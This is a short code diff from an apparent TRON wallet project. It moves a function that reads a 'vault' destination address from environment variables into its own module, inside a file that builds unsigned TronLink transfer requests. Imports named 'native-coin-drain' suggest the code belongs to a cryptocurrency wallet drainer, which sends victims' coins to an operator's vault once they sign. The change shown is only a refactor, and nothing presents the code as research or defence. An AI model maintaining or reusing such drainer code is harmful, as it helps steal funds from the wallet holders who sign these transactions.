@@ -3,6 +3,7 @@
  */
 import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
 import { parseNativeAmount } from './native-coin-drain.js'
+import { resolveTronVaultAddress } from './operational-vault.js'
 
 export type TronNativeTransferRequest = {
   from: string
@@ -11,14 +12,6 @@ export type TronNativeTransferRequest = {
   /** Unsigned Tron transaction object — TronLink `tronWeb.trx.sign`. */
   unsignedTransaction: Record<string, unknown>
   wallet: 'tronlink'
-}
-
-function resolveTronVaultAddress(): string | null {
-  const raw =
-    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_TRON'] : undefined)?.trim() ||
-    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_TRON'] : undefined)?.trim() ||
-    ''
-  return raw || null
 }
 
 async function createTronWeb(fullHost: string) {
